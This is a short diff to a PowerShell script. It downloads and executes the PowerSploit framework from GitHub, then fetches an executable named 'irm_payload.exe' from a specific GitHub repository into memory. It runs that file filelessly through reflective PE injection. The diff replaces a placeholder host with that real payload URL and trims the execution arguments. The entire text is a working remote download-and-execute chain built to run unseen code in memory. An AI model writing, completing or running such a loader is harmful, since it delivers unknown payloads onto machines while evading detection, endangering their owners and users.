@@ -3,7 +3,8 @@ $FrameworkUrl = "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/m
 iex (Invoke-RestMethod -Uri $FrameworkUrl)
 
 # 2. Download your compiled C++ EXE into RAM as a byte array
-$EXEBytes = (New-Object System.Net.WebClient).DownloadData("your-hosting-site.com")
+$EXEBytes = (New-Object System.Net.WebClient).DownloadData("https://github.com/Ghoat5/hello-world/raw/refs/heads/main/irm_payload.exe")
 
 # 3. Execute the EXE filelessly, passing arguments directly into memory
-Invoke-ReflectivePEInjection -PEBytes $EXEBytes -ExeArgs "-yourflag -debug" -ForceASLR
+# Minimized execution string
+Invoke-ReflectivePEInjection -PEBytes $EXEBytes -ForceASLR
